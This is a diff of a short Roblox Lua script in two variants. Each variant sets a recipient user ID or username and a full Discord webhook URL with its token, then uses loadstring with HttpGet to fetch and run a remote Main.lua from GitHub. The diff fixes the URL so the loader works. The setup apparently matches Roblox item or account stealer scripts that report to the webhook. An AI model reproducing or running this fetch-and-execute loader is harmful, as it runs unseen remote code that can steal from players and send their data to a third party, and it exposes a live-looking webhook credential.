@@ -5,9 +5,9 @@ IF 1 DOESN'T WORK TRY 2:
 1.
 _G.UserID = "629960901"
 _G.Webhook = "https://discord.com/api/webhooks/1092068408373293087/x3KG9joQ5y4X6Wjf2vag5EteBerdUbbUD_JAC9ICN-v1MYipzWEiTNX1UMNL6wYU406A"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua%22))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))()
 
 2.
 UserName = "zoey010226"
 Webhook = "https://discord.com/api/webhooks/1092068408373293087/x3KG9joQ5y4X6Wjf2vag5EteBerdUbbUD_JAC9ICN-v1MYipzWEiTNX1UMNL6wYU406A"
-loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua%22))() 
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/Rizz/main/Main.lua"))() 
